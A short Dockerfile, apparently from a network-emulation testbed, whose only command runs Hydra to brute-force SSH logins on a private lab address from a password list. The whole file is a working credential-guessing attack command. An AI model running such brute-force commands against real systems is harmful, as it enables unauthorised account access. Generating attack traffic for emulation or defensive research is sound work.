FROM dockemu/hydra:hydrabot

MAINTAINER marcos cano / oscar rodas {orodas,marcos.cano}@galieo.edu

ENV server 192.168.8.66
CMD hydra -L passwords -V -P passwords -t 4 $server ssh

